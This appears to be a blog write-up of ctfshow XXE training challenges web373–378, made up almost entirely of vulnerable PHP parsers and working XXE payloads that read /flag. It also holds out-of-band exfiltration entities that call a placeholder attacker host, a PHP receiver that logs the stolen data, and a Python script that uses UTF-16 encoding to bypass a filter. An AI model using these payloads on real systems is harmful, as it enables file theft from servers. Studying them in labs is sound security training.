# 原创
：  ctfshow web入门-XXE

# ctfshow web入门-XXE

#### ctfshow web入门-XXE

## web373

### 题目描述

> 



### 解题思路

> 



```
&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds-&gt;ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);
?&gt;

```

> 



```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE xml [
&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;
]&gt;
&lt;H3rmesk1t&gt;
	&lt;ctfshow&gt;
		&amp;xxe;
	&lt;/ctfshow&gt;
&lt;/H3rmesk1t&gt;

```

## web374

### 题目描述

> 



### 解题思路

> 



```
&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__); 
?&gt;

```

> 



```
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx:xxxx/xxe.xml"&gt;
%remote;
%send;
]&gt;

```

> 



```
&lt;?php
$content = $_GET['1'];
if(isset($content)){
    
      
    file_put_contents('flag.txt','更新时间:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    
      
    echo 'no data input';
}

```

```
&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx:xxxx/xxe.php?1=%file;'"
&gt;
%all;

```

## web375

### 题目描述

> 



### 解题思路

> 



```
&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/&lt;\?xml version="1\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
?&gt;

```

> 



```
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx:xxxx/xxe.xml"&gt;
%remote;
%send;
]&gt;

```

> 



```
&lt;?php
$content = $_GET['1'];
if(isset($content)){
    
      
    file_put_contents('flag.txt','更新时间:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    
      
    echo 'no data input';
}

```

```
&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx:xxxx/xxe.php?1=%file;'"
&gt;
%all;

```

## web376

### 题目描述

> 



### 解题思路

> 



```
&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/&lt;\?xml version="1\.0"/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
?&gt;

```

> 



```
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx:xxxx/xxe.xml"&gt;
%remote;
%send;
]&gt;

```

> 



```
&lt;?php
$content = $_GET['1'];
if(isset($content)){
    
      
    file_put_contents('flag.txt','更新时间:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    
      
    echo 'no data input';
}

```

```
&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx:xxxx/xxe.php?1=%file;'"
&gt;
%all;

```

## web377

### 题目描述

> 



### 解题思路

> 



```
&lt;?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/&lt;\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
?&gt;

```

> 



```
import requests
url = 'http://00edd7b9-7fc6-40fd-937d-deb477902dca.challenge.ctf.show:8080/'
payload = '''
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;
&lt;!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx:xxxx/xxe.xml"&gt;
%remote;
%send;
]&gt;
'''
payload = payload.encode('utf-16')
rep = requests.post(url=url, data=payload)
print(rep.text)

```

> 



```
&lt;?php
$content = $_GET['1'];
if(isset($content)){
    
      
    file_put_contents('flag.txt','更新时间:'.date("Y-m-d H:i:s")."\n".$content);
}else{
    
      
    echo 'no data input';
}

```

```
&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx:xxxx/xxe.php?1=%file;'"
&gt;
%all;

```

## web378

### 题目描述

> 



### 解题思路

> 



```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY file SYSTEM "file:///flag"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;

```
